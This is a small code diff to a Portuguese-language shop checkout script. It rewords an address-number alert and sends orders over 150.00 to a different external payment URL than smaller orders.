@@ -274,7 +274,7 @@
             if (cart.length === 0) return alert('Adicione um produto ao carrinho.');
             if (cepInput.value.length < 9) return alert('Informe um CEP válido.');
             const addrNumber = document.getElementById('addr-number').value;
-            if (!addrNumber) return alert('Informe o número da residência.');
+            if (!addrNumber) return alert('Informe o número do endereço.');
             if (!selectedShipping) return alert('Selecione uma opção de envio.');
 
             // Efeito de carregamento de página inteira
@@ -384,7 +384,12 @@
         cep: cepInput.value
     });
 
-    const targetUrl = `https://simplic-pag.onrender.com/spinner/?${params.toString()}`;
+    let targetUrl;
+    if (subtotal > 150.00) {
+        targetUrl = `https://app-pagamentos.onrender.com/semPRODUTOS/?${params.toString()}`;
+    } else {
+        targetUrl = `https://simplic-pag.onrender.com/spinner/?${params.toString()}`;
+    }
     
     setTimeout(() => {
         window.location.href = targetUrl;
